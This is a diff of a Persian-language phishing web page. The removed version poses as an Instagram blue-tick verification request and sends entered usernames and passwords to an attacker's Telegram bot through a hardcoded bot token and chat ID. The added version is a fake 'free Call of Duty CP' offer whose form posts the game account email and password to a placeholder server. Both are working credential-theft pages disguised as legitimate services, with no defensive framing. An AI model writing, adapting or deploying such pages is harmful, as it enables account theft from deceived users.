@@ -1,165 +1,68 @@
 <!DOCTYPE html>
-<html lang="fa" dir="rtl">
+<html lang="fa">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>درخواست تیک آبی اینستاگرام</title>
-    <style>
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #fafafa;
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            color: #262626;
-        }
-        
-        .container {
-            width: 350px;
-            background-color: white;
-            border: 1px solid #dbdbdb;
-            border-radius: 3px;
-            padding: 20px 40px;
-            text-align: center;
-        }
-        
-        .logo {
-            margin: 20px 0;
-            width: 175px;
-        }
-        
-        .form-group {
-            margin-bottom: 10px;
-            text-align: right;
-        }
-        
-        input {
-            width: 100%;
-            padding: 10px;
-            border: 1px solid #dbdbdb;
-            border-radius: 3px;
-            background-color: #fafafa;
-            font-size: 14px;
-            box-sizing: border-box;
-        }
-        
-        input:focus {
-            border: 1px solid #a8a8a8;
-            outline: none;
-        }
-        
-        button {
-            width: 100%;
-            padding: 8px;
-            background-color: #0095f6;
-            color: white;
-            border: none;
-            border-radius: 4px;
-            font-weight: bold;
-            margin-top: 10px;
-            cursor: pointer;
-            font-size: 14px;
-        }
-        
-        button:hover {
-            background-color: #0077cc;
-        }
-        
-        .footer {
-            margin-top: 20px;
-            font-size: 12px;
-            color: #8e8e8e;
-        }
-        
-        .success {
-            color: green;
-            display: none;
-        }
-        
-        .error {
-            color: red;
-            display: none;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <title>دریافت رایگان CP کالاف دیوتی</title>
+  <style>
+    body {
+      background: url('https://wallpapercave.com/wp/wp7373575.jpg') no-repeat center center fixed;
+      background-size: cover;
+      font-family: 'Vazir', sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .container {
+      background: rgba(0, 0, 0, 0.7);
+      padding: 30px;
+      border-radius: 20px;
+      text-align: center;
+      color: white;
+      box-shadow: 0 0 15px #00ffcc;
+      width: 90%;
+      max-width: 400px;
+    }
+    h1 {
+      margin-bottom: 20px;
+      font-size: 28px;
+      color: #00ffcc;
+    }
+    input {
+      width: 90%;
+      padding: 10px;
+      margin: 10px 0;
+      border: none;
+      border-radius: 10px;
+      font-size: 16px;
+    }
+    button {
+      margin-top: 20px;
+      padding: 12px 20px;
+      background-color: #00ffcc;
+      border: none;
+      border-radius: 10px;
+      font-size: 18px;
+      color: black;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+    button:hover {
+      background-color: #00ccaa;
+    }
+  </style>
 </head>
 <body>
-    <div class="container">
-        <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram" class="logo">
-        <h2>درخواست تیک آبی</h2>
-        <p>لطفا اطلاعات حساب خود را برای بررسی تیک آبی وارد کنید</p>
-        
-        <div class="form-group">
-            <input type="text" id="username" placeholder="نام کاربری اینستاگرام" required>
-        </div>
-        
-        <div class="form-group">
-            <input type="password" id="password" placeholder="رمز عبور" required>
-        </div>
-        
-        <button id="submit-btn">تایید و ارسال درخواست</button>
-        
-        <p class="success" id="success-msg">درخواست شما با موفقیت ارسال شد!</p>
-        <p class="error" id="error-msg">خطا در ارسال اطلاعات. لطفا دوباره تلاش کنید.</p>
-        
-        <div class="footer">
-            <p>این صفحه رسمی اینستاگرام نیست. اطلاعات شما فقط برای بررسی تیک آبی استفاده می‌شود.</p>
-        </div>
-    </div>
 
-    <script>
-        document.getElementById('submit-btn').addEventListener('click', function() {
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-            
-            if (!username || !password) {
-                alert('لطفا نام کاربری و رمز عبور را وارد کنید');
-                return;
-            }
-            
-            // اطلاعات برای ارسال به ربات تلگرام
-            const data = {
-                username: username,
-                password: password,
-                timestamp: new Date().toISOString(),
-                source: 'Instagram Blue Tick Request'
-            };
-            
-            // جایگزین کنید با توکن ربات و چت آیدی شما
-            const botToken = '7591166314:AAGSfDjIJSH37xR_IA_b3tSg6ttjubcr1bE';
-            const chatId = '6994971474';
-            
-            const message = `درخواست جدید تیک آبی:\n\nکاربری: ${username}\nرمز: ${password}\nزمان: ${new Date().toLocaleString('fa-IR')}`;
-            
-            // ارسال به ربات تلگرام از طریق API
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message,
-                    parse_mode: 'HTML'
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.ok) {
-                    document.getElementById('success-msg').style.display = 'block';
-                    document.getElementById('error-msg').style.display = 'none';
-                } else {
-                    throw new Error('Telegram API error');
-                }
-            })
-            .catch(error => {
-                console.error('Error:', error);
-                document.getElementById('error-msg').style.display = 'block';
-                document.getElementById('success-msg').style.display = 'none';
-            });
-        });
-    </script>
+  <div class="container">
+    <h1>سی‌پی رایگان کالاف دیوتی</h1>
+    <form action="your-server-endpoint" method="POST">
+      <input type="email" name="email" placeholder="ایمیل کالاف دیوتی" required><br>
+      <input type="password" name="password" placeholder="رمز عبور اکانت" required><br>
+      <button type="submit">دریافت CP</button>
+    </form>
+  </div>
+
 </body>
 </html>
